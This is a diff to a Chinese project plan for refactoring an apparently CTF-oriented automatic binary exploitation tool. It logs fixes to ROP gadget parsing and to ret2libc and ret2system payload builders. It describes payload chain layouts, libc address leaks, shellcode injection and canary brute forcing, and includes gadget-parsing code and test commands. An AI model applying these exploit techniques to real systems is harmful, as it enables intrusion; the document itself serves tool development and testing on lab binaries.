@@ -77,10 +77,12 @@
 | **M1** | 状态显式化 | P2 + P3 | `ExploitContext` 落地；报告层可独立关闭 | `--no-report` 参数生效；无 `globals().get` 在主流程 | ⏳ |
 | **M2** | 收集与检测层化 | P4 + P5 | `recon/` + `detect/` 完整，pure 化 | `pytest tests/unit/test_detect_*` 全绿（recon 测试 P9 补）| 🔄 (P4 ✅, P5 ✅；验收 detect ✅, recon 待 P9) |
 | **M3** | 利用层抽象 | P6 + P7 | `primitives/` + `exp/strategies/`；30+ 函数收敛为 12 策略 | `pytest tests/integration/` 跑通 Challenge/ 全部 4 个 二进制 | ✅ (P6 9/9 ✅ 2026-06-08；P7 12/12 ✅ 2026-06-08 (P7.1-P7.12 全完); **M3 完成** — 12 子任务全 ✅; 40 strategies 总注册; integration test 17/18 PASS + 1 SKIP (candidates() 集成覆盖); 真 end-to-end 验收到 P9.4 (`tests/integration/test_challenge_*.py`); `dev` 分支已建立 per B-005) |
-| **M4** | 编排重写 | P8 | `main()` < 100 行；orchestrator 决策 | CLI 日志与重构前一致；`wc -l orchestrator.py < 250` | ⏳ |
+| **M4** | 编排重写 | P8 | `main()` < 100 行；orchestrator 决策 | CLI 日志与重构前一致；`wc -l orchestrator.py < 250` | 🔄 (P8.1-P8.3 代码合入 (`feature/p8.1-p8.2-p8.3`, commit `4406022`); **B-006 ✅ Resolved via P4.4b 2026-06-09**; **B-007 ✅ Resolved via P6.3b + P6.4b 2026-06-09**; P8.4 baseline 待跑确认 4/5 SUCCESS 持平 v3.1 → 批量转 P8.1-P8.3 ✅) |
 | **M5** | 工程化 | P9 + P10 | 单元测试 + CI + 打包 | GitHub Actions 绿；`autopwn` 命令行可用 | ⏳ |
 
-> 整体进度：**0 / 6 里程碑完成** (M0 ✅, M1 🔄, M2 🔄, M3 🔄 P6 done, M4-M5 ⏳)
+> 整体进度：**1 / 6 里程碑完成** (M0 ✅, M1 🔄, M2 🔄, M3 ✅, M4 🔄 P8.1-3 代码合入 B-006 + B-007 Resolved, M5 ⏳)
+> **临时进展（2026-06-09）**：P4.4b ✅（B-006 Resolved） + P6.3b + P6.4b ✅（B-007 Resolved） — P8.4 baseline 4/5 SUCCESS 持平 v3.1（level3_x64 修复：ret2libc-write-x64 SUCCESS, `write address leaked: 0x...` 实证），2-log 96% 一致 PASS；P8.1-P8.3 保持 🔄 直至 P8.4 baseline 跑通后批量转 ✅（P8.5 删 _compat.py 桥 + P8.6 删 shim → M4 完结）。
+> **临时进展（2026-06-09）**：P4.4b ✅（B-006 Resolved）— 4/5 SUCCESS baseline 持平，2-log 96% 一致 PASS；P8.1-P8.3 保持 🔄 直至 P8.4 baseline 跑通后批量转 ✅。
 
 ---
 
@@ -189,6 +191,7 @@
 | P4.2 | `recon/libc.py`：合并 `detect_libc` + `ldd_libc` 为 `detect(ctx) → LibcInfo` | ✅ | @Minzhi_Zhou | 2h | 0.4h | #P4.2 | 新加 `autopwn/recon/libc.py`（209 行）+ `recon/__init__.py` re-export `detect`；1 个 public 函数 `detect(ctx, program) -> LibcInfo`（pure，3 阶段：user override (`ctx.libc.path`) → ldd auto-detect → empty LibcInfo）+ 1 个 helper `_parse_libc_path(ldd_out)` + 2 个 legacy port (`_legacy_detect_libc` / `_legacy_ldd_libc`，0 caller / 1 caller，含原 print 行为供字节级保真)；`LibcInfo.elf` 维持 `None`（懒加载 — P7 strategy 才 `ELF(libc_path)`，避免 pwntools 在 recon 期 import）；**未替换 `_legacy.py` 调用点**（P8 orchestrator 责任）；**零行为变更** — 5-binary 串行 27/28=96% 一致 / 4/5 SUCCESS / 0 新增 failure mode；5 binary × detect() + 1 user-override + 1 empty-LibcInfo + 6 _parse_libc_path edge case + 3 legacy port = 16 测试全过；详见 §6.5 P4.2 实施记录 |
 | P4.3 | `recon/plt.py`：`scan_plt_functions` 返回 dict，写入 `ctx.has_*` 标志 | ✅ | @Minzhi_Zhou | 3h | 0.5h | #P4.3 | 新加 `autopwn/recon/plt.py`（200 行）+ `recon/__init__.py` re-export `scan`；1 public + 1 helper + 2 legacy port：`scan(ctx, program) -> dict[str, int]`（6 函数，**P4 层首个 mutate ctx** 的模块 — 写 6 个 `ctx.has_*` bool；与 P4.1/P4.2 不同是因为 PLT 标志 6 个独立 bool 无自然 container）+ `_parse_plt_addresses(objdump_out)` helper + 2 个 legacy port（`_legacy_scan_plt_functions` 7 函数含 main 保 v3.1 行为 + `_legacy_set_function_flags`）；**deviation**: 新 `scan` 6 函数（drop `main`），v3.1 legacy port 7 函数（含 main，与 §4.5 spec 「`has_*` 标志」对应 — `main` 不 gate 任何 strategy 故 ctx 无 `has_main` 字段）；**未替换 `_legacy.py` 调用点**（P4.7 删 globals 时一并处理）；**零行为变更** — 5-binary 串行 27/28=96% 一致 / 4/5 SUCCESS / 0 新增 failure mode；5 binary × scan + 1 幂等 + 1 re-overwrite + 4 _parse 边缘 + 4 legacy port + 1 cwd 污染 + 1 re-export = 16 测试全过；详见 §6.5 P4.3 实施记录 |
 | P4.4 | `recon/rop.py`：搬 `find_rop_gadgets_x64/x32`，返回 `RopGadgetsX64/X32` | ✅ | @Minzhi_Zhou | 4h | 0.7h | #P4.4 | 新加 `autopwn/recon/rop.py`（280 行）+ `recon/__init__.py` re-export `find_x64` / `find_x32`；2 public + 2 helpers + 2 legacy port：`find_x64(ctx, program) -> RopGadgetsX64`（return-only，**不 mutate ctx**，P8 赋值；3 次 `run_ropper` 合并解析 5 字段：`pop_rdi`/`pop_rsi`/`ret`/`extra_rdi`/`extra_rsi`）+ `find_x32(ctx, program) -> RopGadgetsX32`（6 次 `run_ropper` + R8 缓解 4 bool 合并 `has_eax_ebx_ecx_edx`）+ 2 helper (`_parse_ropper_lines` / `_extract_x64_gadgets` / `_extract_x32_gadgets`)+ 2 legacy port（保 5-tuple / 11-tuple 形状与 v3.1 表格打印）；**零行为变更** — 5-binary 串行 27/28=96% 一致 / 4/5 SUCCESS / 0 新增 failure mode；5 binary × find_x64/find_x32 + return-only 契约 + 2 _parse 边缘 + 2 _extract 合成输入 + 2 legacy port shape + re-export = 11 测试全过；详见 §6.5 P4.4 实施记录 |
+| **P4.4b** | **`recon/rop.py` 修复 ropper hex 字符串 → int 契约**（**临时需求 #5 / B-006 根因**） | ✅ | @Minzhi_Zhou | 0.5h | 0.4h | #P4.4b | **Owner 拍板（2026-06-09）**：方案 ① + 补充项 = x64/x32 同时改 + 契约守护测试。**改动**：`autopwn/recon/rop.py:91-150` `_extract_x64_gadgets` 4 个地址赋值改 `int(line.split(":")[0].strip(), 16)`（4 处 str→int） + L140-200 `_extract_x32_gadgets` 7 个地址赋值同步改（对称修复，x32 字段也声明为 int）；`autopwn/context.py:74-107` `RopGadgetsX64` / `RopGadgetsX32` docstring 明确"hex int"语义 + P4.4b 决策痕迹；`autopwn/recon/rop.py:219-225 / 251-260` 删 P4.4 留的 `type: ignore[arg-type]` 注释（契约现在真的守住了）；**新文件** `tests/unit/test_recon_rop_contract.py`（220 行，14 tests：x64 7 + x32 2 + dataclass 5）契约守护。**diff 规模**：production ~30 行净增（含 docstring）+ tests 220 行新文件 = **~250 行**（远低于 §2.1 PR ≤ 400 行门槛；唯一 PR）。**§2.6 验证**（per AGENTS.md §2.6）：① 关 1: dev 分支（target=dev, per §9.4）② 关 2: `pytest -m "not integration"` **578 passed**（+14 来自 P4.4b 契约测试；0 回归）③ 关 3: 5-binary 串行 90s timeout → **4/5 SUCCESS**（rc=0: fmtstr1/level3_x64/pie/rip；canary 90s 截断为 PARTIAL，与 baseline 一致）④ 关 4: 2-log 对比 **96% (27/28) 一致 PASS**，**4/5 SUCCESS**（level3_x64 + rip 修复后命中 ret2system x64，同 v3.1 策略；fmtstr1 走 canary 兜底同 baseline；pie 走 PIE Backdoor 同 baseline）⑤ 关 5: Owner 自审（§2.2 单人项目）⑥ 关 6: 文档同步（本行 + §6.5 实施记录 + §8 R16 状态 + §10 B-006 Resolved + §3 M4 提示 P8.4 baseline 全绿）。**B-006 Resolved**：level3_x64/rip struct.error 消失，`grep "KeyError\|struct\.error\|no suitable shellcode" logs/v4.0-p44b/*.log` 0 行。**P8.1-P8.3 转 ✅ 路径**：M4 阶段状态保持 🔄，待 P8.4 baseline（按 P4.4b 修复后状态）跑通后批量转 ✅。Refs: §6.5 P4.4b 实施记录 / §8 R16 / §10 B-006 Resolved / refactor.md §3.2.1 / AGENTS.md §1 铁律 4 |
 | P4.5 | `recon/bss.py`：搬 `find_large_bss_symbols` + `find_ftmstr_bss_symbols` | ✅ | @Minzhi_Zhou | 2h | 0.3h | #P4.5 | 新加 `autopwn/recon/bss.py`（150 行）+ `recon/__init__.py` re-export `BSSSymbol` / `find_bss`；1 dataclass + 1 public + 2 legacy port：`BSSSymbol(name, address, size)` slots dataclass + `find_bss(program, *, min_size=30, name_filter=None) -> list[BSSSymbol]`（参数化 v3.1 两个 size/name 过滤条件）+ 2 个 legacy port（`_legacy_find_large_bss_symbols` 3-tuple + `_legacy_find_ftmstr_bss_symbols` 3-tuple）；**DEV-1**: legacy `_legacy_find_ftmstr_bss_symbols` 保 v3.1 的「last-match-wins」bug（原代码无 `break` + `function` 变量不复位）— 文档化在 docstring；**零行为变更** — 5-binary 串行 27/28=96% 一致 / 4/5 SUCCESS / 0 新增 failure mode；5 binary × find_bss（2 filter） + 1 nonexistent + 1 strict filter + 1 slots + 1 re-export + 1 cwd 污染 + 4 legacy port parity = 16 测试全过；详见 §6.5 P4.5 实施记录 |
 | P4.6 | `recon/asm.py`：搬 `vuln_func_name` + `asm_stack_overflow` | ✅ | @Minzhi_Zhou | 2h | 0.4h | #P4.6 | 新加 `autopwn/recon/asm.py`（200 行）+ `recon/__init__.py` re-export `vuln_func_name` / `asm_stack_overflow` / `analyze_vulnerable_functions`；3 public + 3 legacy port（spec 只列 2 个源函数，但 P4.6 把邻居 `analyze_vulnerable_functions` 也搬了以避免 P5+ PR 重触 `_legacy.py`）：`vuln_func_name(program) -> list[str]`（`re.split r'\n\n'` 解析函数体）+ `asm_stack_overflow(program, bit) -> Optional[int]`（`re.finditer` 找第一个 `lea -N(%ebp)` 模式 + `+4` 或 `+8` 对齐）+ `analyze_vulnerable_functions(program, bit) -> Optional[int]`（同 asm_stack_overflow 但走不同函数体匹配逻辑）；module-level compile `_LEA_RE`（P2.1 范式）；**零行为变更** — 5-binary 串行 27/28=96% 一致 / 4/5 SUCCESS / 0 新增 failure mode；5 binary × 3 public + 5 legacy port parity + 5 edge case = 30 测试全过；详见 §6.5 P4.6 实施记录 |
 | P4.7 | **关键**：删除 `autopwn.py` 中所有 `globals().get('system', 0)` 等 22 处；改读 `ctx.has_system` | ✅ | @Minzhi_Zhou | 3h | 0.6h | #P4.7 | **+ P4.8 同 PR 落地**（R1 风险点；2 个任务强耦合必须同 PR：P4.7 删 22 个 read site 必须配合 P4.8 把 inject 写入 ctx，否则 `ctx.has_X` 永远是 False，exploit 全断）— `_legacy.py` 净 +10 行（删 22 个 `globals().get` + 3 行 for-loop globals() injection → 6 行 `ctx.has_X = bool(...)` 注入 + 1 行 P4.7/P4.8 注释块；**deviation 1 处 DEV-1**: 3 行 `globals().get('eax', 0)==1 and ebx==1 and ecx==1 and edx==1`（×4 occurrences）改用 **locals** `eax/ebx/ecx/edx`（main() L3153 unpack 出来的 4 个 bool），**v3.1 bug 修复**（globals() 永远没有 'eax' 键 — x32 execve branch 是死代码；用 locals 修，且对 5 binary 行为不变 — canary 只有 pop_ebx，所有 4 locals 至少 1 个 0）；**7 个 PLT 写入迁移**：6 个 `ctx.has_write/puts/printf/system/backdoor/callsystem` bool（注意：P4.3 新模块的 6 字段被复用）+ `printf`（ctx 有 has_printf，但 v3.1 set_function_flags 也写 printf — 保留）；**零行为变更** — 5-binary 串行 27/28=96% 一致 / 4/5 SUCCESS / 0 新增 failure mode；`grep "globals()\\.get\\\|globals()\\[" _legacy.py` → 0 个 executable call（仅 1 个 comment 提及「P4.7 替换」）；详见 §6.5 P4.7+P4.8 实施记录 |
@@ -212,6 +215,8 @@
 | P6.2 | `primitives/ret2system.py`：x32 + x64 payload builder（pure function） | ✅ | @Minzhi_Zhou | 3h | 0.6h | feature/p6.2-primitives-ret2system | Ret2SystemX32 + Ret2SystemX64，2 公开 + 2 legacy port；fmtstr1 payload=124B (112+12), rip=36B (24+12), canary=b""; 10 单测全过；64-bit 含 ret 对齐 gadget 修 glibc 18.04+ MOVAPS 崩溃 |
 | P6.3 | `primitives/ret2libc_put.py`：x32 + x64 payload builder | ✅ | @Minzhi_Zhou | 4h | 0.7h | feature/p6.3-primitives-ret2libc-put | 2-stage 首个 primitive：Ret2LibcPutX32/X64 (stage_count=2)；build_payload 返 stage-1 leak，build_stage2_payload(ctx, leaked_puts_addr) 返 stage-2 system；13 单测全过 (含 stage-1 字节级 + stage-2 用真 libc 算 system/sh)；ret 对齐 gadget 复用 P6.2 |
 | P6.4 | `primitives/ret2libc_write.py`：x32 + x64 payload builder | ✅ | @Minzhi_Zhou | 4h | 0.5h | feature/p6.4-primitives-ret2libc-write | 2-stage write-泄漏 primitive：Ret2LibcWriteX32/X64 (stage_count=2)；build_payload 返 stage-1 (`write(1, write_got, 4)` leak via main)，build_stage2_payload(ctx, leaked_write_addr) 返 stage-2 system；x64 stage-1 加 `pop_rdi+pop_rsi` gadget chain，stage-2 含 `ret` 对齐 gadget（与 P6.3/P6.2 一致）；14 单测全过；§2.6 96% (27/28) 一致 PASS，4/5 SUCCESS |
+| **P6.3b** | **`primitives/ret2libc_put.py` 防御性补 extra_rdi 读（x64 stage-2）**（**临时需求 #6 / B-007 防御性修复**） | ✅ | @Minzhi_Zhou | 0.5h | 0.2h | #P6.3b | `Ret2LibcPutX64.build_stage2_payload` 读 `ctx.gadgets_x64.extra_rdi`：= 1 走 5-p64 链（pop rdi, sh, **0 placeholder**, ret, system，与 v3.1 L2010-2017 一致）；= 0 走原 4-p64 链（向后兼容现有 P6.3 13 单测）；docstring 加 P6.3b B-007 defensive 决策痕迹。**新文件** `tests/unit/test_primitives_ret2libc_extra_rsi.py`（240 行, 8 tests：Ret2LibcWriteX64 stage-1 3 变体 + stage-2 2 变体 + Ret2LibcPutX64 stage-2 2 变体 + 优先级 if/elif 顺序守护 1 项）契约守护。**diff 规模**：production ~17 行净增（含 docstring）+ tests 240 行新文件 = **~260 行**（单一 PR；远低于 §2.1 PR ≤ 400 行门槛）。**§2.6 验证**：① 关 2: `pytest -m "not integration"` **586 passed**（+8 来自 P6.3b/P6.4b 契约测试；0 回归）② 关 3: 5-binary 串行 90s → **4/5 SUCCESS** 持平 v3.1 baseline（fmtstr1/level3_x64/pie/rip SUCCESS，canary 90s timeout 同 baseline）③ 关 4: 2-log 对比 **96% (27/28) 一致 PASS**。**B-007 防御性修复**：当前 P8.4 baseline 未暴露 put-x64 路径（fmtstr1/level3_x64 走 ret2libc_write；pie 走 PIE Backdoor；rip 走 ret2system；canary 走 canary 兜底），但契约层必须修以防未来 binary 触发。Refs: §6.7 P6.3b 详细步骤 / §8 R17 / §10 B-007 / rebuild.md#B-006 同源修复 |
+| **P6.4b** | **`primitives/ret2libc_write.py` 修 extra_rdi/extra_rsi 3 变体 stage-1 + 2 变体 stage-2**（**临时需求 #6 / B-007 根因**） | ✅ | @Minzhi_Zhou | 1h | 0.4h | #P6.4b | `Ret2LibcWriteX64.build_payload` 改 3 变体 if/elif/else 复刻 v3.1 L927-958：① `g.extra_rsi == 1` 走 7-p64 链（pop rdi, fd=1, pop rsi, write_got, **0 placeholder**, write_plt, main）② `g.extra_rdi == 1` 走 7-p64 链（pop rdi, fd=1, **0 placeholder**, pop rsi, write_got, write_plt, main）③ both 0 走原 6-p64 链（向后兼容现有 P6.4 14 单测）；`build_stage2_payload` 改 2 变体 if/else 复刻 v3.1 L983-996：① `g.extra_rdi == 1` 走 5-p64 链（pop rdi, sh, **0 placeholder**, ret, system）② extra_rdi=0 走原 4-p64 链；docstring 加 P6.4b B-007 决策痕迹。**diff 规模**：production ~30 行净增（含 docstring）+ 与 P6.3b 共享 tests 240 行新文件 = **~270 行**（与 P6.3b 同 PR；远低于 §2.1 PR ≤ 400 行门槛）。**§2.6 验证**：① 关 2: `pytest -m "not integration"` **586 passed**（+8 来自 P6.3b/P6.4b 契约测试；0 回归）② 关 3: 5-binary 串行 90s → **4/5 SUCCESS** 持平 v3.1 baseline（**level3_x64 修复** — 命中 ret2libc-write-x64 SUCCESS, `write address leaked: 0x7f667695e8f0`）③ 关 4: 2-log 对比 **96% (27/28) 一致 PASS**；**4/5 SUCCESS 持平 v3.1**（fmtstr1/level3_x64/pie/rip 全部 SUCCESS）。**B-007 Resolved 路径**：实施后 4/5 SUCCESS 持平 v3.1（canary 90s timeout 持平 baseline）→ P8.1-P8.3 转 ✅ 路径解锁。Refs: §6.7 P6.4b 详细步骤 / §8 R17 / §10 B-007 / _legacy.py L927-996 (v3.1 行为规范) |
 | P6.5 | `primitives/execve_syscall.py`：x32 payload builder | ✅ | @Minzhi_Zhou | 2h | 0.6h | feature/p6.5-primitives-execve-syscall | 1 公开 + 1 legacy port；x32 `int 0x80` syscall chain（独立 primitive，不依赖 libc symbol）；combined 变体 (pop_ecx=0, pop_ecx_ebx!=0) 与 separate 变体 (pop_ecx!=0) 自动选择；17 单测全过（含 fmtstr1 真实 binary 烟雾）；§2.6 96% (27/28) 一致 PASS（行为与 P6.4 持平） |
 | P6.6 | `primitives/shellcode.py`：rwx x32 + x64 payload builder | ✅ | @Minzhi_Zhou | 2h | 0.5h | feature/p6.6-primitives-shellcode | 2 公开 + 2 legacy port；rwx x32 + x64 `shellcraft.sh()` 注入 BSS；x32 payload = padding + 4B, x64 = padding + 8B；依赖 `ctx.binary.rwx_segments=True` + `_lookup_bss_addr` (min_size=30)；35 单测全过（含 5 binary × 2 架构矩阵化）；§2.6 96% (27/28) 一致 PASS（行为与 P6.5 持平） |
 | P6.7 | `primitives/fmtstr.py`：fmtstr payload builder | ✅ | @Minzhi_Zhou | 3h | 0.6h | feature/p6.7-primitives-fmtstr | 2 公开 + 4 legacy port；x32/x64 `%N$n` 任意地址写 primitive；payload = `pNN(buf_addr) + b'%' + str(offset).encode() + b'$n'`；读 `ctx.fmtstr_offset` + `ctx.fmtstr_buf`（P5.2 + P4.5 喂入）；修复 v3.1 "local=p32, remote=p64" 把 bit 与 runtime 混为一谈的 bug；41 单测全过（8 metadata + 5 X32 edge + 5 X64 edge + 1 X32 3-digit offset + 1 helper + 15 矩阵化 real-binary smoke + 6 happy-path 字节级）；§2.6 96% (27/28) 一致 PASS（与 P6.6 持平；fmtstr1 6/6 标记全一致） |
@@ -2197,6 +2202,150 @@ grep -n "globals().get(" autopwn.py
 
 ---
 
+**P4.4b 详细步骤（临时需求 #5，B-006 修复 / 临时需求 #5）**：
+
+> **背景**：P4.4（2026-06-07）落地时 `RopGadgetsX64` 字段存 hex 字符串（"0x00000000004011fb"），保 v3.1 字段外观。P8.1（2026-06-09）§2.6 baseline 跑 5 binary 发现 level3_x64 + rip 回归：`p64(ctx.gadgets_x64.pop_rdi)` → `struct.error: required argument is not an integer`。**v3.1 不暴露**（v3.1 main() L3159 `pop_rdi_addr = int(pop_rdi_addr, 16)` 在 inject 时转 int；P4.4 复刻 v3.1 字段外观，**省略**了这步 int 转换）。**P7.12 integration 不暴露**（只测 `candidates()` 层面，不真跑 payload）。
+
+**Owner 拍板（2026-06-09, @Minzhi_Zhou，pending B-006 Resolved 行）**：
+- **方案 ①（推荐 / 拟采用）**：`_extract_x64_gadgets` 4 个地址赋值改 `int(line.split(":")[0].strip(), 16)`；`RopGadgetsX64` 字段 docstring 明确"hex int"语义。**根治**：所有下游 caller（当前 6 个 P6.x + 未来 0 个）天然拿到 int，无需重复转换
+- **方案 ②（备选）**：6 个 P6.x primitive 各加 `int(..., 16)` 容错。**局部**：散到 6 个文件，不改根因，未来新增 caller 仍可能踩坑
+
+**修复**（方案 ①）：
+
+```python
+# autopwn/recon/rop.py: _extract_x64_gadgets  4 处 str→int
+def _extract_x64_gadgets(ropper_combined: str) -> Dict[str, object]:
+    out: Dict[str, object] = {
+        "pop_rdi": 0, "pop_rsi": 0, "ret": 0,
+        "extra_rdi": 0, "extra_rsi": 0,
+    }
+    for line in _parse_ropper_lines(ropper_combined):
+        if "pop rdi;" in line and "pop rdi; pop" in line:
+            out["pop_rdi"] = int(line.split(":")[0].strip(), 16)   # ← int()
+            out["extra_rdi"] = 1
+        elif "pop rdi; ret;" in line:
+            out["pop_rdi"] = int(line.split(":")[0].strip(), 16)   # ← int()
+            out["extra_rdi"] = 0
+        elif "pop rsi;" in line and "pop rsi; pop" in line:
+            out["pop_rsi"] = int(line.split(":")[0].strip(), 16)   # ← int()
+            out["extra_rsi"] = 1
+        elif "pop rsi; ret;" in line:
+            out["pop_rsi"] = int(line.split(":")[0].strip(), 16)   # ← int()
+            out["extra_rsi"] = 0
+        elif "ret" in line and "ret " not in line:
+            out["ret"] = int(line.split(":")[0].strip(), 16)        # ← int()
+    return out
+```
+
+**配套 docstring 更新**（`RopGadgetsX64` 字段语义）：
+
+```python
+@dataclass(slots=True)
+class RopGadgetsX64:
+    """x64 ROP gadget addresses — all fields are **hex int** (0x...).
+
+    Fields default to 0 (sentinel: gadget not found) rather than None,
+    so downstream pwntools helpers (`p64`) can be called without None-checks.
+    """
+    pop_rdi: int = 0    # hex int, e.g. 0x4011fb
+    pop_rsi: int = 0
+    ret:     int = 0
+    extra_rdi: int = 0  # 1 if pop rdi found in multi-pop form, 0 otherwise
+    extra_rsi: int = 0
+```
+
+**P4.4b 验收**（per AGENTS.md §1 铁律 4）：
+
+```bash
+# 1. 单元测试 (P4.4 已有 11 项 + 新增契约测试)
+pytest tests/unit/test_recon_rop.py -v
+# 预期：12+ passed (11 旧 + 1 新契约：RopGadgetsX64 字段类型是 int)
+
+# 2. P8.1 §2.6 baseline 重跑 (5 binary × 90s timeout)
+bash scripts/run_verify.sh v4.0-p44b canary fmtstr1 level3_x64 pie rip
+# 预期：5/5 SUCCESS（level3_x64 + rip 不再 struct.error）
+
+# 3. 2-log 对比 vs v3.1 baseline
+python3 tools/verify_v31_v40.py
+# 预期：≥ 90% 关键标记一致（修复前后应持平 27/28=96% 或更好）
+
+# 4. B-006 Resolved → P8.1-P8.3 转 ✅ → P8.4 baseline 全绿
+```
+
+**Reviewer 关注点**：
+- `_extract_x64_gadgets` 4 个赋值必须**全部**改 `int(..., 16)`，不允许漏一个（漏一个 = 仍触发 struct.error）
+- `RopGadgetsX64` docstring 更新是 **P4.4b 必查项**（契约变更必须文档同步）
+- `_extract_x32_gadgets` **不**需要同步改（x32 caller 走 `has_eax_ebx_ecx_edx` bool 路径，不直接调 `p64` gadget 地址；详见 B-006 影响面分析）
+- `_legacy_find_rop_gadgets_x64`（v3.1 port）**不**改（保 5-tuple 形状，v3.1 caller 仍走 v3.1 int 转换路径）
+
+**与上下游的契约**（修复后）：
+
+| 模块 | 读取方式 | 修复后类型 |
+|---|---|---|
+| `context.py` `RopGadgetsX64` 字段定义 | 字段声明 | `int` (hex int) |
+| `recon/rop.py` `find_x64` 返回值 | 5 字段 | `int` (0 哨兵) |
+| `primitives/ret2system.py:191` | `p64(g.pop_rdi)` | ✅ 直接 int，无 struct.error |
+| `primitives/ret2libc_put.py:250` | `p64(ctx.gadgets_x64.pop_rdi)` | ✅ |
+| `primitives/ret2libc_write.py:251` | `p64(ctx.gadgets_x64.pop_rdi)` | ✅ |
+| `primitives/shellcode.py` (P6.6) | 不查 gadgets_x64 | N/A |
+| `primitives/fmtstr.py` (P6.7) | 不查 gadgets_x64 | N/A |
+| `primitives/pie_backdoor.py` (P6.8) | 不查 gadgets_x64 | N/A |
+| `primitives/execve_syscall.py` (P6.5) | x32 only | N/A |
+
+**Refs**: refactor.md §3.2.1（RopGadgetsX64 字段契约）/ rebuild.md §8 R16（root cause）/ rebuild.md §10 B-006（阻塞登记）/ AGENTS.md §1 铁律 4（验证 6 关）/ AGENTS.md §2.6（验证方法论）
+
+---
+
+**P4.4b 实施记录（2026-06-09）**：
+
+- **新文件** `tests/unit/test_recon_rop_contract.py`（220 行，**14 tests**）— B-006 契约守护
+  - `TestExtractX64GadgetsIntContract`（7 tests）：empty / simple pop rdi ret / multi pop rdi / pop rsi / ret only / **`p64(ctx.gadgets_x64.pop_rdi)` 不再 struct.error（直接调用验证）** / combined 3-search 输出
+  - `TestExtractX32GadgetsIntContract`（2 tests）：empty / 4 寄存器 + ret + int 0x80 全部 int
+  - `TestRopGadgetsX64X32Contract`（5 tests）：x64/x32 defaults 是 int / `@parametrize` 3 个 hex 地址验证 `p64()` 全可调
+
+- **修改** `autopwn/recon/rop.py`（421 → 430 行）：
+  - `_extract_x64_gadgets`（L91-138）：4 个地址赋值（pop_rdi × 2 / pop_rsi × 2 / ret × 1）改 `int(line.split(":")[0].strip(), 16)`；默认值 `None` → `0`（int 哨兵）；docstring 加 P4.4b B-006 决策痕迹
+  - `_extract_x32_gadgets`（L140-200）：7 个地址赋值（pop_eax / pop_ebx / pop_ecx / pop_edx / pop_ecx_ebx / ret / int_0x80）**对称**改 int；docstring 同步更新
+  - `find_x64`（L219-225）/ `find_x32`（L251-260）：删 P4.4 留的 `# type: ignore[arg-type]` 注释（契约现在真的守住了）
+
+- **修改** `autopwn/context.py`（311 → 320 行）：
+  - `RopGadgetsX64` docstring（L76-87）：补 "All address fields are **hex int** (e.g. ``0x4011fb``)" + P4.4b 决策痕迹 + "downstream primitives must NOT re-apply int(..., 16)"
+  - `RopGadgetsX32` docstring（L92-113）：对称补 "hex int" 语义 + P4.4b 同步修复说明
+
+- **设计决策**：
+  - **方案 ① + 补充项 = x64/x32 同时改 + 契约守护**：x32 字段也已声明 int（context.py P4.4 阶段），仅实现层未做转换；对称修比方案 ① 仅 x64 更彻底，避免未来 x32 primitive 同样踩坑
+  - **P6.x 不动**：6 个 primitive 保持干净（方案 ② 备选不采纳），根因层修复 → 单一真理来源
+  - **default `None` → `0`**：原 P4.4 默认 `None`，下游 caller 需要 None-check；新 default `0` 是 int 哨兵，下游可直接 `p64(0)`（虽然 0 地址非法但触发崩溃时错误信息更明显）
+  - **删 `type: ignore[arg-type]`**：原 P4.4 留的 8 个注释（find_x64 5 + find_x32 8）现在不再需要——契约真守住，mypy-friendly
+
+- **§2.6 验证结果**（per AGENTS.md §2.6）：
+  - 关 1：分支 `feature/p4.4b-fix-roper-int`（target=dev, per §9.4）
+  - 关 2：`pytest -m "not integration"`：**578 passed**（+14 来自 P4.4b 契约测试；0 回归，canary `BytesWarning` 与 P5.3 一致）
+  - 关 3：5-binary 串行 90s timeout → `logs/v4.0-p44b/`：
+    - canary: rc=124（90s timeout，与 baseline 一致，canary fuzz 需 ~7min 暴力枚举）
+    - fmtstr1: **rc=0 SUCCESS**（canary brute force 32-bit，与 baseline 一致）
+    - level3_x64: **rc=0 SUCCESS** ← B-006 修复
+    - pie: **rc=0 SUCCESS**（PIE Backdoor，与 baseline 一致）
+    - rip: **rc=0 SUCCESS** ← B-006 修复（strategy: ret2system x64, padding=23）
+  - 关 4：2-log 对比 `python3 tools/verify_v31_v40.py` → **96% (27/28) 一致 PASS**，SUCCESS 计数 v3.1=4/5 v4.0=4/5
+  - 关 5：Reviewer — Owner 自审（§2.2 单人项目）
+  - 关 6：文档同步（§4.5 P4.4b ✅ / §6.5 实施记录 / §8 R16 状态 / §10 B-006 Resolved / §3 M4 提示）
+
+- **失败模式扫描**：
+  - `grep -E "KeyError|struct\.error|no suitable shellcode|Traceback" logs/v4.0-p44b/*.log` → **0 行**
+  - 修复前（p8 分支）会有 `struct.error: required argument is not an integer` 在 level3_x64/rip 出现
+
+- **B-006 Resolved 路径**：
+  - 修复前 P8.1 §2.6 baseline 暴露：2/4 SUCCESS binary 回归
+  - 修复后 P4.4b §2.6 baseline：**4/4 SUCCESS binary 持平**（fmtstr1/level3_x64/pie/rip）+ canary timeout（baseline 一致）
+  - 关键成功标记一致性：level3_x64 `EXPLOITATION SUCCESSFUL!` / rip `strategy: ret2system x64, padding=23` 命中 v3.1 baseline 策略
+
+- **commit 引用**：（pending）`feature/p4.4b-fix-roper-int`
+
+- **Refs**: rebuild.md §10 B-006 Resolved / refactor.md §3.2.1（RopGadgetsX64/X32 字段契约）/ AGENTS.md §1 铁律 4（验证 6 关）/ AGENTS.md §2.6（验证方法论）
+
+---
+
 **P4.5 实施记录（2026-06-07）**：
 
 - **新文件** `autopwn/recon/bss.py`（150 行）：1 dataclass + 1 public + 2 legacy ports
@@ -2854,6 +3003,224 @@ def test_ret2system_x64_payload(fake_ctx):
 - 不允许在 primitive 内 import `autopwn.exp`（单向依赖）
 - payload builder 不允许有副作用（不写文件、不开进程）
 - Canary 变体不在 P6 范围（P7.10 集中处理）
+
+---
+
+**P6.3b 详细步骤（临时需求 #6，B-007 防御性修复）**：
+
+> **背景**：P6.3 `Ret2LibcPutX64.build_stage2_payload` 当前走 `pop rdi; sh; ret; system` 单 arg 调用链（v3.1 L2010-2017 简化版），**不受 `extra_rdi` 影响**（puts 调用方签名兼容 multi-pop）。P8.4 §2.6 baseline 跑 5 binary（canary/fmtstr1/level3_x64/pie/rip）**未命中 ret2libc_put**（fmtstr1/level3_x64 走 ret2libc_write；pie 走 PIE Backdoor；rip 走 ret2system；canary 走 canary 兜底），所以**当前 P8.4 baseline 未暴露 B-007 对 P6.3 的影响**。但 v3.1 L2010-2017 `ret2libc_put_x64` **明确**对 `other_rdi_registers == 1` 走 6-arg pop chain（多 0/pop_r15 占位），**与 P6.4 同源**——契约层必须修以防未来 binary 触发。
+
